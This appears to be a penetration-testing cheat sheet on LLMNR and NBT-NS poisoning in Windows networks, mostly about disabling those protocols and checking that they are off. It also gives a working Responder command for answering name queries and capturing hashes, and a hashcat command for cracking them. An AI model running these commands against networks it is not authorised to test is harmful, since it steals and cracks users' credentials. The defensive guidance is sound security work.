## Overview
LLMNR is a protocol that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local network without requiring a DNS server or DNS configuration.
When a host’s DNS query fails (i.e., the DNS server doesn’t know the name), the host broadcasts an LLMNR request on the local network to see if any other host can answer. <br><br>
LLMNR is the successor to NetBIOS.  NetBIOS (Network Basic Input/Output System) is an older protocol that was heavily used in early versions of Windows networking. NBT-NS is a component of NetBIOS over TCP/IP (NBT) and is responsible for name registration and resolution.  Like LLMNR, NBT-NS is a fallback protocol when DNS resolution fails. It allows local name resolution within a LAN.

## Exploitation [EASY]
Listen for LLMNR requests and respond with our own attacker IP address, to redirect the traffic:
```bash
sudo responder -I eth0 -dwPv
```
Once an event occurs, we can grab the hash and try to crack it using custom wordlists:
```bash
hashcat –m 5600 HASH-FILE CUSTOM-WORDLIST
```
## Mitigation
- Disable LLMNR by selecting “Turn OFF Multicast Name Resolution” under Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor.<br><br>
- Then, disabled NBT-NS via GPO using the following Powershell script under Startup Scripts in Computer Configuration > Policies > Windows Settings > Scripts > Startup:
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\tcpip* -Name NetbiosOptions -Value 2
```
## Confirming mitigations
Check for LLMNR:
```powershell
$(Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" -name EnableMulticast).EnableMulticast
```
Check for NBT-NS:
```bash
wmic nicconfig get caption,index,TcpipNetbiosOptions
```
## Best practice
- Ensure password complexity (greater than 14 characters, alphanumeric, symbols)
- Use [Network Access Control](https://www.fortinet.com/resources/cyberglossary/what-is-network-access-control).
